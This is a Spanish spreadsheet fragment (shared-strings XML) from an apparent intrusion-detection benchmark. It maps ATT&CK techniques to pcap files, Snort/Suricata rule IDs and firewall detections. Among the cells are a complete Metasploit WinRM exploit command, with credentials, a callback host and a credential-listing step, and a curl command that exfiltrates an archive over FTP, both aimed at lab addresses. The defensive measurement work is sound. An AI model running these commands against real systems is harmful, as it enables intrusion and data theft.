        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: la diferencia en los números de flujos detectados se debe puramente al método de identificación de flujos (no hay pérdida de información)</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta el uso de comandos de forma remota, aunque esto se trata de una acción meramente residual, que no está relacionada con la naturaleza del ataque.</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Ataques colaterales</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>: Detección de Metasploit Meterpreter conexión.</t>
    </r>
  </si>
  <si>
    <t>Descubrimiento de servicios y version</t>
  </si>
  <si>
    <t>Nikto</t>
  </si>
  <si>
    <t>T1046-Version_services_detection1_[3].pcapng</t>
  </si>
  <si>
    <t>Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.3</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.3.4</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.3.5</t>
  </si>
  <si>
    <t>El descubrimiento de servicios y versiones se considera como ataque</t>
  </si>
  <si>
    <t>1071, 1242, 1131, 1130, 1044, 1129, 987, 1245, 977, 971, 1880, 1852, 1145, 2056, 913, 914, 912, 985, 1400, 962, 1288, 853, 2152, 1738, 1875, 1301, 2002, 918, 999, 1000, 993, 1486, 1172, 857, 1284, 3201, 986, 1256, 1016, 1826, 1482, 1567, 1568, 1772, 2076, 1080, 1128, 1076, 1492, 1493, 1560, 2565, 1146, 1848, 1148, 1125, 1166, 1286, 1660, 1765, 1528, 1164, 2484, 903, 1551, 2228, 1402, 1150, 1576, 1152, 1580, 1153, 1154, 2062, 1048, 1103, 1586, 1577, 1578, 1579, 931, 2246, 1587, 1122, 1002, 992, 1401, 875, 1829, 911, 1244, 966, 906, 928, 1773, 1517, 1147, 2154, 1491, 1611, 2000, 1157, 1828, 1376, 2077, 1827, 1231, 1767, 1774, 1834, 1667, 2347, 2346, 1835, 1998, 882, 922, 1659, 1877, 1212, 910, 930, 1722, 1108, 915, 935, 1141, 1163, 2060, 1173, 1544, 936, 1230, 1742, 1743, 1540, 1250, 2138, 1168, 1407, 1385, 1564, 805, 1726, 940, 937, 952, 967, 1248, 955, 958, 961, 965, 1847, 1175, 1111, 1592, 43290, 1481, 1521, 1201, 1123, 1183, 1160, 1500, 1013, 807, 1193, 979, 1023, 1024, 1487, 1018, 2325, 1162, 1134, 1213, 904, 932, 907, 905, 1214, 1215, 1192, 1155, 1556, 1161, 1202, 1030, 1040, 887, 878, 1038, 1022, 1077, 1078, 946, 1075, 984, 1073, 851, 1127, 844, 1585, 1584, 1582, 1151, 1575, 1583, 1581, 2148, 2151, 2144, 1458, 2137, 2397, 1525, 2215, 2223, 1787, 1724, 43289, 2204, 2205, 2206, 1637, 1142, 2073, 2225, 2130, 2131, 1997, 2214, 1037, 2085, 2219, 2133, 1434, 1433, 1872, 1874, 839, 941, 945, 879, 950, 1542, 944, 943, 980, 942, 947, 968, 956, 949, 957, 990, 953, 951, 959, 964, 2447, 1005, 1559, 1119, 1120, 908, 1816, 1614, 2395, 1871, 2326, 2196, 954, 948, 1851, 1110, 1489, 818, 1032, 1043, 1033, 1034, 1035, 1036, 1031, 2142, 1527, 1526, 902, 2198, 1520, 1209, 1557, 1555, 1770, 1769, 1873, 1522, 1523, 1004, 895, 2393, 2276, 2295, 1671, 2363, 1399, 1091, 2285, 2140, 2410, 886, 2281, 2288, 2298, 1254, 43285</t>
  </si>
  <si>
    <t>1071, 1242, 1131, 1130, 1044, 1129, 987, 1245, 977, 971, 1880, 1852, 1145, 2056, 913, 914, 912, 985, 1400, 962, 1288, 853, 2152, 1738, 1875, 1301, 2002, 918, 999, 1000, 993, 1486, 1172, 857, 1284, 3201, 986, 1256, 1016, 1826, 1482, 1567, 1568, 1772, 2076, 1080, 1128, 1076, 1492, 1493, 1560, 2565, 1146, 1848, 1148, 1125, 1166, 1286, 1660, 1765, 1528, 1164, 2484, 903, 1551, 2228, 1402, 1150, 1576, 1152, 1580, 1153, 1154, 2062, 1048, 1103, 1586, 1577, 1578, 1579, 931, 2246, 1587, 1122, 1002, 992, 1401, 875, 1829, 911, 1244, 966, 906, 928, 1773, 1517, 1147, 2154, 1491, 1611, 2000, 1157, 1828, 1376, 2077, 1827, 1231, 1767, 1774, 1834, 1667, 2347, 2346, 1835, 1998, 882, 922, 1659, 1877, 1212, 910, 930, 1722, 1108, 915, 935, 1141, 1163, 2060, 1173, 1544, 936, 1230, 1742, 1743, 1540, 1250, 2138, 1168, 1407, 1385, 1564, 805, 1726, 940, 937, 952, 967, 1248, 955, 958, 961, 965, 1847, 1175, 1111, 1592, 43290, 1481, 1521, 1201, 1123, 1183, 1160, 1500, 1013, 807, 1193, 979, 1023, 1024, 1487, 1018, 2325, 1162, 1134, 1213, 904, 932, 907, 905, 1214, 1215, 1192, 1155, 1556, 1161, 1202, 1030, 1040, 887, 878, 1038, 1022, 1077, 1078, 946, 1075, 984, 1073, 851, 1127, 844, 1585, 1584, 1582, 1151, 1575, 1583, 1581, 2148, 2151, 2144, 1458, 2137, 2397, 1525, 2215, 2223, 1787, 1724, 43289, 2204, 2205, 2206, 1637, 1142, 2073, 2225, 2130, 2131, 1997, 2214, 1037, 2085, 2219, 2133, 1434, 1433, 1872, 1874, 839, 941, 945, 879, 950, 1542, 944, 943, 980, 942, 947, 968, 956, 949, 957, 990, 953, 951, 959, 964, 2447, 1005, 1559, 1119, 1120, 908, 1816, 1614, 2395, 1871, 2326, 2196, 954, 948, 1851, 1110, 1489, 818, 1032, 1043, 1033, 1034, 1035, 1036, 1031, 2142, 1527, 1526, 902, 2198, 1520, 1209, 1557, 1555, 1770, 1769, 1873, 1522, 1523, 1004, 895, 2393, 2276, 2295, 1671, 2363, 1399, 1091, 2285, 2140, 2410, 886, 2281, 2288, 2298, 1254, 43285, 2002677, 2101071, 2101242, 2027262, 2016141, 2101129, 2100987, 2027265, 2027250, 2018752, 2027263, 2101245, 2027253, 2101145, 2010766, 2100993, 2101256, 2101016, 2019714, 2101402, 2049400, 2009362, 2009361, 2101401, 2030337, 2101244, 2049401, 2011042, 2010963, 2006446, 2006445, 2009714, 2019526, 2101877, 2101108, 2016184, 2100952, 2100977, 2100958, 2100961, 2100965, 2011141, 2011144, 2011142, 2011143, 2021390, 2101201, 2101013, 2101487, 2101018, 2009485, 2102073, 2049402, 2101874, 2100953, 2100951, 2100959, 2100981, 2100982, 2101403, 2016182, 2011696, 2011564, 2009317, 2009318, 2010920, 2009931, 2010475, 2012795, 2009384, 2009391, 2009369, 2012369, 2002879, 2010485, 2008897, 2017442, 2010260, 2009933, 2012013, 2009051, 2010354, 2008833, 2010355, 2009892, 2009316, 2010197, 2010276, 2010466, 2017441, 2010362, 2010473, 2009932, 2011274, 2010124, 2010564, 2010125, 2011384, 2011259, 2017440, 2010484, 2009887, 2009325, 2009326, 2009229, 2009071, 2019524, 2002901, 2014180, 2010254, 2017436</t>
  </si>
  <si>
    <t xml:space="preserve">2002677, 2101071, 2101242, 2027262, 2016141, 2101129, 2100987, 2027265, 2027250, 2018752, 2027263, 2101245, 2027253, 2101145, 2010766, 2100993, 2101256, 2101016, 2019714, 2101402, 2049400, 2009362, 2009361, 2101401, 2030337, 2101244, 2049401, 2011042, 2010963, 2006446, 2006445, 2009714, 2019526, 2101877, 2101108, 2016184, 2100952, 2100977, 2100958, 2100961, 2100965, 2011141, 2011144, 2011142, 2011143, 2021390, 2101201, 2101013, 2101487, 2101018, 2009485, 2102073, 2049402, 2101874, 2100953, 2100951, 2100959, 2100981, 2100982, 2101403, 2016182, 2011696, 2011564, 2009317, 2009318, 2010920, 2009931, 2010475, 2012795, 2009384, 2009391, 2009369, 2012369, 2002879, 2010485, 2008897, 2017442, 2010260, 2009933, 2012013, 2009051, 2010354, 2008833, 2010355, 2009892, 2009316, 2010197, 2010276, 2010466, 2017441, 2010362, 2010473, 2009932, 2011274, 2010124, 2010564, 2010125, 2011384, 2011259, 2017440, 2010484, 2009887, 2009325, 2009326, 2009229, 2009071, 2019524, 2002901, 2014180, 2010254, 2017436, 43238, 50447, 1071, 1242, 1131, 1130, 1044, 1129, 987, 41188, 20173, 1245, 977, 971, 41187, 1880, 1852, 1145, 300003, 18742, 2056, 913, 914, 912, 41742, 985, 1400, 962, 1288, 853, 2152, 1738, 1875, 1301, 2002, 8492, 918, 43808, 999, 1000, 993, 1486, 1172, 857, 1284, 3201, 986, 1256, 24342, 1016, 1826, 1482, 1567, 1568, 1772, 2076, 1080, 39348, 1128, 1076, 1492, 1493, 1560, 2565, 53017, 1146, 1848, 1148, 1125, 1166, 1286, 1660, 1765, 1528, 1164, 2484, 903, 1551, 2228, 1402, 1150, 1576, 1152, 1580, 1153, 1154, 2062, 1048, 1103, 56563, 1586, 1577, 1578, 1579, 931, 2246, 1587, 1122, 1002, 992, 1401, 875, 1829, 31940, 911, 1244, 966, 42323, 906, 928, 8493, 1773, 3674, 1517, 45380, 1147, 2154, 1491, 1611, 2000, 1157, 1828, 42465, 1376, 13990, 16431, 31860, 7070, 2077, 20258, 1827, 1231, 20674, 1767, 42289, 1774, 1834, 7071, 1667, 61117, 36037, 2347, 2346, 1835, 1998, 882, 49920, 922, 1659, 1877, 1212, 910, 930, 1722, 1108, 8490, 915, 935, 25975, 1141, 59237, 1163, 2060, 1173, 1544, 936, 1230, 1742, 1743, 38371, 1540, 1250, 2138, 1168, 1407, 1385, 1564, 805, 1726, 940, 937, 952, 967, 1248, 955, 958, 961, 965, 1847, 1175, 1111, 43356, 1592, 43290, 1481, 1521, 1201, 1123, 1183, 1160, 1500, 1013, 807, 1193, 979, 21161, 1023, 1024, 1487, 1018, 2325, 1162, 1134, 1213, 904, 932, 907, 905, 1214, 1215, 1192, 1155, 1556, 1161, 1202, 1030, 1040, 60573, 887, 878, 1038, 1022, 1077, 1078, 946, 1075, 984, 1073, 851, 1127, 50921, 844, 1585, 1584, 1582, 1151, 1575, 1583, 1581, 41189, 2148, 2151, 2144, 1458, 2137, 2397, 1525, 2215, 2223, 1787, 1724, 43289, 2204, 2205, 2206, 1637, 1142, 2073, 2225, 31377, 2130, 2131, 1997, 2214, 1037, 2085, 2219, 2133, 1434, 1433, 1872, 1874, 839, 941, 945, 879, 950, 1542, 944, 943, 980, 942, 947, 968, 956, 949, 957, 990, 953, 951, 959, 964, 2447, 1005, 1559, 55647, 1119, 1120, 908, 1816, 1614, 2395, 1871, 2326, 2196, 954, 948, 1851, 1110, 1489, 818, 1032, 1043, 1033, 1034, 1035, 1036, 1031, 2142, 1527, 1526, 902, 2198, 1520, 1209, 1557, 1555, 1770, 1769, 33613, 33612, 1873, 1522, 1523, 1004, 895, 21515, 2393, 50923, 50924, 50925, 50922, 41817, 2276, 25977, 21516, 59258, 20663, 31360, 59332, 20654, 27218, 2295, 28912, 31637, 20631, 20632, 20633, 27230, 31362, 28957, 27192, 20815, 16613, 27688, 43724, 43691, 20656, 1671, 20728, 20731, 2363, 1399, 31638, 1091, 20651, 20826, 44133, 2285, 2140, 31419, 2410, 886, 2281, 43392, 18478, 27284, 20732, 2288, 2298, 1254, 31568, 24502, 23362, 22097, 22064, 43285
</t>
  </si>
  <si>
    <t xml:space="preserve">2002752, 2002749, 2002677, 2101071, 2101242, 2027262, 2016141, 2003595, 2101129, 2100987, 2027265, 2027250, 2018752, 2027263, 2009885, 2101245, 2100971, 2027253, 2101852, 2101145, 2010767, 2010766, 2102056, 2101288, 2101738, 2009151, 2001343, 2100993, 2101256, 2003099, 2101016, 2019714, 2101402, 2014379, 2011031, 2049400, 2009362, 2009361, 2101002, 2101945, 2101401, 2101829, 2012911, 2030337, 2101244, 2101122, 2100988, 2049401, 2001949, 2012913, 2011042, 2010963, 2006609, 2006445, 2011040, 2009714, 2001218, 2101827, 2004589, 2019526, 2004592, 2101877, 2101108, 2100915, 2016184, 2009001, 2020296, 2002731, 2100937, 2100952, 2100977, 2100958, 2100961, 2100965, 2101847, 2101111, 2011141, 2011144, 2011142, 2011143, 2002070, 2021390, 2101201, 2101013, 2101193, 2101023, 2101487, 2101018, 2101372, 2009485, 2009884, 2102073, 2102131, 2049402, 2101156, 2101874, 2100953, 2100951, 2100959, 2101110, 2101489, 2100981, 2100982, 2101403, 2101332, 2002133, 2016182, 2011696, 2010377, 2009435, 2003670, 2011564, 2009167, 2010095, 2009317, 2009318, 2003740, 2009397, 2002681, 2010920, 2009931, 2009848, 2009321, 2010475, 2009311, 2009313, 2012795, 2009382, 2009367, 2009757, 2009758, 2009759, 2009755, 2009756, 2009760, 2009754, 2009466, 2009467, 2009468, 2009384, 2009059, 2009060, 2009061, 2009062, 2009877, 2009391, 2009369, 2012369, 2002879, 2010485, 2008897, 2009871, 2009872, 2009873, 2009196, 2003738, 2010099, 2003699, 2017442, 2009459, 2009898, 2009166, 2003677, 2003682, 2003704, 2010260, 2009933, 2012013, 2008826, 2009307, 2009051, 2010354, 2002815, 2009788, 2010027, 2003678, 2003679, 2009225, 2010252, 2008833, 2010355, 2009793, 2003731, 2009163, 2003688, 2003696, 2009892, 2009398, 2002800, 2003703, 2100884, 2003729, 2003728, 2003727, 2003726, 2009316, 2009101, 2010197, 2008904, 2008903, 2010276, 2008900, 2008901, 2008902, 2010126, 2003671, 2010466, 2003739, 2003333, 2008922, 2009427, 2002902, 2008871, 2003680, 2017441, 2003698, 2003701, 2008879, 2010362, 2009381, 2009386, 2010473, 2009188, 2009903, 2008899, 2009180, 2003737, 2003717, 2003517, 2009932, 2011274, 2003732, 2003733, 2003718, 2003700, 2003689, 2009364, 2010124, 2010564, 2010125, 2002996, 2003331, 2011384, 2011259, 2003672, 2003673, 2003674, 2003675, 2003676, 2017440, 2009415, 2003660, 2003661, 2003664, 2010484, 2003662, 2009372, 2003663, 2003665, 2003666, 2003667, 2003668, 2003681, 2003694, 2002898, 2009887, 2003705, 2003706, 2003707, 2003708, 2003715, 2003709, 2003711, 2003713, 2003712, 2003710, 2003714, 2003867, 2003693, 2009370, 2009371, 2008964, 2009504, 2009502, 2009723, 2003702, 2009325, 2009326, 2008962, 2009164, 2003720, 2003719, 2003721, 2009123, 2009506, 2009229, 2003741, 2003743, 2003744, 2003745, 2009071, 2008996, 2009179, 2019524, 2002901, 2009333, 2009733, 2003669, 2009656, 2009653, 2009378, 2009717, 2009379, 2014180, 2010254, 2003716, 2017436, 2003692, 2003747, 2003686, 2009190, 2011160, 43238, 50447, 1071, 1242, 1131, 1130, 1044, 1129, 987, 41188, 20173, 1245, 977, 971, 41187, 1880, 1852, 1145, 300003, 18742, 2056, 913, 914, 912, 41742, 985, 1400, 962, 1288, 853, 2152, 1738, 1875, 1301, 2002, 8492, 918, 43808, 999, 1000, 993, 1486, 1172, 857, 1284, 3201, 986, 1256, 24342, 1016, 1826, 1482, 1567, 1568, 1772, 2076, 1080, 39348, 1128, 1076, 1492, 1493, 1560, 2565, 53017, 1146, 1848, 1148, 1125, 1166, 1286, 1660, 1765, 1528, 1164, 2484, 903, 1551, 2228, 1402, 1150, 1576, 1152, 1580, 1153, 1154, 2062, 1048, 1103, 56563, 1586, 1577, 1578, 1579, 931, 2246, 1587, 1122, 1002, 992, 1401, 875, 1829, 31940, 911, 1244, 966, 42323, 906, 928, 8493, 1773, 3674, 1517, 45380, 1147, 2154, 1491, 1611, 2000, 1157, 1828, 42465, 1376, 13990, 16431, 31860, 7070, 2077, 20258, 1827, 1231, 20674, 1767, 42289, 1774, 1834, 7071, 1667, 61117, 36037, 2347, 2346, 1835, 1998, 882, 49920, 922, 1659, 1877, 1212, 910, 930, 1722, 1108, 8490, 915, 935, 25975, 1141, 59237, 1163, 2060, 1173, 1544, 936, 1230, 1742, 1743, 38371, 1540, 1250, 2138, 1168, 1407, 1385, 1564, 805, 1726, 940, 937, 952, 967, 1248, 955, 958, 961, 965, 1847, 1175, 1111, 43356, 1592, 43290, 1481, 1521, 1201, 1123, 1183, 1160, 1500, 1013, 807, 1193, 979, 21161, 1023, 1024, 1487, 1018, 2325, 1162, 1134, 1213, 904, 932, 907, 905, 1214, 1215, 1192, 1155, 1556, 1161, 1202, 1030, 1040, 60573, 887, 878, 1038, 1022, 1077, 1078, 946, 1075, 984, 1073, 851, 1127, 50921, 844, 1585, 1584, 1582, 1151, 1575, 1583, 1581, 41189, 2148, 2151, 2144, 1458, 2137, 2397, 1525, 2215, 2223, 1787, 1724, 43289, 2204, 2205, 2206, 1637, 1142, 2073, 2225, 31377, 2130, 2131, 1997, 2214, 1037, 2085, 2219, 2133, 1434, 1433, 1872, 1874, 839, 941, 945, 879, 950, 1542, 944, 943, 980, 942, 947, 968, 956, 949, 957, 990, 953, 951, 959, 964, 2447, 1005, 1559, 55647, 1119, 1120, 908, 1816, 1614, 2395, 1871, 2326, 2196, 954, 948, 1851, 1110, 1489, 818, 1032, 1043, 1033, 1034, 1035, 1036, 1031, 2142, 1527, 1526, 902, 2198, 1520, 1209, 1557, 1555, 1770, 1769, 33613, 33612, 1873, 1522, 1523, 1004, 895, 21515, 2393, 50923, 50924, 50925, 50922, 41817, 2276, 25977, 21516, 59258, 20663, 31360, 59332, 20654, 27218, 2295, 28912, 31637, 20631, 20632, 20633, 27230, 31362, 28957, 27192, 20815, 16613, 27688, 43724, 43691, 20656, 1671, 20728, 20731, 2363, 1399, 31638, 1091, 20651, 20826, 44133, 2285, 2140, 31419, 2410, 886, 2281, 43392, 18478, 27284, 20732, 2288, 2298, 1254, 31568, 24502, 23362, 22097, 22064, 43285
</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Instancias Ataque</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">: cada URL escaneada se considera como una instancia de ataque independiente                                                            </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Análisis Manual:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> este ataque, debido al gran número de alertas generadas y al tamaño del fichero no ha podido analizarse manualmente. Los resultados automáticos contarán pero no se contabilizarán los SIDs para las tablas de análisis</t>
    </r>
  </si>
  <si>
    <t>44780, 12648, 12475, 15229, 10604, 15463, 12699, 12935, 12560, 12426, 12439, 29261, 46767, 29264, 13116, 27560, 43336, 12265, 12015, 13106, 13011, 56146, 14088, 15621, 17702, 10574, 12577, 15221, 12909, 12933, 13056, 12758, 12709, 12459, 24975, 30908, 56270, 12979, 13801, 50825, 12980, 10003, 48010, 15117, 29613, 14946, 15091, 14950, 14957, 14848, 14955, 14857, 14956, 13825, 14305, 14849, 15115, 29615, 15100, 14873, 14847, 14954, 14374, 14740, 14286, 30542, 14405, 14338, 14157, 15116, 15092, 14850, 14942, 14949, 14852, 15118, 29564, 14855, 14859, 14743, 14734, 14742, 14406, 15110, 14953, 14851, 14404, 15114, 14952, 14856, 14341, 14858, 14266, 14736, 14345, 15225, 29614, 14484, 14948, 29965, 31752, 29263, 47202</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Instancias Ataque</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">: cada URL escaneada se considera como una instancia de ataque independiente.                                                                  </t>
    </r>
  </si>
  <si>
    <t>9999, 30092, 30120, 30323, 30350, 30444, 30510, 30514, 30520, 30798, 30815, 30818, 30844, 30851, 30852, 30853, 30888, 30903, 30914, 30921, 31476, 31477, 31932, 32190, 32194, 32451, 32622, 32658, 32672, 32688, 32689, 32691, 32696, 32701, 32703, 32712, 33327, 33330, 33339, 33467, 33645, 33756, 33779, 33783, 34200, 34439, 34519, 34804, 35010, 35107, 35298, 36096, 36102, 36280, 36315, 38402, 38531, 39455, 39766, 39810, 54469, 54701, 55558, 55834, 58209, 58461, 58618, 90136, 91328, 91655, 92485, 93646, 94328, 94849</t>
  </si>
  <si>
    <t>T1046-Version_services_detection2_[3].pcapng</t>
  </si>
  <si>
    <t>29456, 384, 453, 408, 451, 1421, 1420, 1418, 257, 598</t>
  </si>
  <si>
    <t>2010937, 2010939, 2010938, 2002911, 2010936, 2010935, 2002910, 2100257, 2100598, 2009358, 2024364, 384, 453, 408, 451, 1421, 1420, 1418, 257, 598, 29456</t>
  </si>
  <si>
    <t>2010937, 2010939, 2010938, 2002911, 2010936, 2010935, 2002910, 2100257, 2100598, 2009358, 2024364, 384, 453, 408, 451, 1421, 1420, 1418, 257, 598, 36650, 13586, 50447, 29456</t>
  </si>
  <si>
    <t>2100469, 2100384, 2002752, 2002749, 2009582, 2000538, 2100453, 2100408, 2100451, 2010937, 2001689, 2010939, 2010938, 2002911, 2100615, 2010936, 2010935, 2002910, 2101420, 2101418, 2100257, 2100598, 2009358, 2024364, 384, 453, 408, 451, 1421, 1420, 1418, 257, 598, 36650, 13586, 50447</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Análisis Manual:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> este ataque, debido al gran número de alertas generadas y al tamaño del fichero no ha podido analizarse manualmente. Los resultados automáticos contarán pero no se contabilizarán los SIDs para las tablas de análisis                                                         </t>
    </r>
  </si>
  <si>
    <t>45360, 43814, 18157</t>
  </si>
  <si>
    <t>proto="tcp" app="incomplete"</t>
  </si>
  <si>
    <t>31914, 32796, 58433, 94317</t>
  </si>
  <si>
    <t>32796, 58433, 94317</t>
  </si>
  <si>
    <t>PaloAlto detecta el uso de NMAP para un escaneo de puertos. El resto de flujos detectados mediante alertas "TRAFFIC" se consideran parte del ataque detectándose mediante Control de Aplicaciones (proto="tcp" app="incomplete" porque no lleva información adicional a nivel de app)</t>
  </si>
  <si>
    <t>65457</t>
  </si>
  <si>
    <t>Execution</t>
  </si>
  <si>
    <t>TA0002</t>
  </si>
  <si>
    <t>Windows Management Instrumentation</t>
  </si>
  <si>
    <t>T1047</t>
  </si>
  <si>
    <t>Ejecución de carga por WinRM</t>
  </si>
  <si>
    <t>Metasploit</t>
  </si>
  <si>
    <t>T1047-WinRM_[2].pcapng</t>
  </si>
  <si>
    <t>Establecimiento de sesión remota mediante Metasploit - T1059</t>
  </si>
  <si>
    <t>Regla genérica que detecte intento de ejecucion de código shell en un equipo aprovechando vulnerabilidades en WinRM</t>
  </si>
  <si>
    <t>Ejecucion de payload en un equipo mediante WinRM. Comando: msfconsole -x "use exploit/windows/winrm/winrm_script_exec; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; set LPORT 5555; set username administrator; set password vagrant; set force_vbs true; run -z; sessions -c 'cmdkey /list'; sessions -k 1; exit"</t>
  </si>
  <si>
    <t>Manual [2] /  3.1.4.1</t>
  </si>
  <si>
    <t>Manual [4] / B.26</t>
  </si>
  <si>
    <t>Manual [2] /  4.2.1.5</t>
  </si>
  <si>
    <t>El aprovechamiento de la vulnerabilidad de la herramienta WinRM hace que este ataque siempre se comporte como tal (aunque la ejecución de código remoto también pueda darse en contextos legítimos)</t>
  </si>
  <si>
    <t>1394, 2033952, 2035480, 2025644</t>
  </si>
  <si>
    <t>1394, 2033952, 2025644</t>
  </si>
  <si>
    <t>1394, 20619, 2033952, 2035480, 2025644</t>
  </si>
  <si>
    <t>2035480, 20619</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">1394, 2033952, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF57BB8A"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2025644</t>
    </r>
  </si>
  <si>
    <t>1394, 20619, 2033952, 2035480, 2025644, 2002752, 2002749, 2006409, 2000419, 2101620</t>
  </si>
  <si>
    <t>2002752, 2002749, 2101620</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2002752, 2002749</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>,</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> 20619</t>
    </r>
  </si>
  <si>
    <t>20619, 2006409, 2035480</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">: la diferencia recae en el método de identificación de flujos. No hay pérdida de información.                                                             </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Instancias Colaterales</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snort detecta tanto el ataque como el uso de Metasploit como herramienta auxiliar</t>
    </r>
  </si>
  <si>
    <t>9999, 59997, 90099, 34556, 31708, 40031, 40006</t>
  </si>
  <si>
    <t>59997, 90099, 40031. 40006, 9999, 34556, 31708</t>
  </si>
  <si>
    <t>Exfiltration Over Alternative Protocol</t>
  </si>
  <si>
    <t>T1048</t>
  </si>
  <si>
    <t>Exfiltration Over Unencrypted Non-C2 Protocol</t>
  </si>
  <si>
    <t>T1048.003</t>
  </si>
  <si>
    <t>Exfiltración por FTP</t>
  </si>
  <si>
    <t>T1048.003-Exfiltration_over_FTP_[3].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte FTP STOR</t>
  </si>
  <si>
    <t>Exfiltracion de datos utilizando el protocolo FTP. Utilizando caldera y la operacion Advanced Thief. Comando: curl -T stage_to_steal.tar.gz.gpg ftp://172.16.1.2/VictimDirectory/ --user "dit:dit"</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.15</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.15.4</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.15.5</t>
  </si>
  <si>
    <t>El uso de FTP para enviar datos se corresponde con un ataque</t>
  </si>
  <si>
    <t>2002752, 2002749, 2100472, 2003303, 2003410, 2015016,</t>
  </si>
  <si>
    <t>2002752, 2002749, 2100472</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2002752, 2002749, 2100472,</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> 2003303, 2003410,</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> 2015016,</t>
    </r>
  </si>
  <si>
    <t>2003303, 2003410</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no identifica un flujo ICMP (no afecta a los resultados)</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados FG:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> la diferencia de flujos se debe a la presencia de retransmisiones. No afecta a los resultados</t>
    </r>
  </si>
  <si>
    <t>Exfiltración por ICMP</t>
  </si>
  <si>
    <t>hping3</t>
  </si>
  <si>
    <t xml:space="preserve">T1048.003-Exfiltration_over_ICMP_[2].pcapng </t>
  </si>
  <si>
